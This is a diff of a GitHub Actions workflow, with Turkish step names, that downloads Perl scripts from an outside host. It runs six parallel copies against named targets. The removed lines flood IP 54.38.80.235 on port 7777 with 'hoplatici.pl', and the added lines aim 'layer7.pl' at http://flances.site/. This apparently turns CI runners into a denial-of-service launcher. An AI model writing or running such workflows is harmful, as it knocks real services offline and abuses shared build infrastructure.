@@ -16,14 +16,14 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/AzG2jAUbv2/hoplatici.pl
+          wget https://wgetz.com/C8l6A80AdA/layer7.pl
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
         run: |
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            perl hoplatici.pl 54.38.80.235 7777 1400 100 &
+            perl layer7.pl http://flances.site/ 1000 1000 optional &
             PIDS+=($!)
           done
           
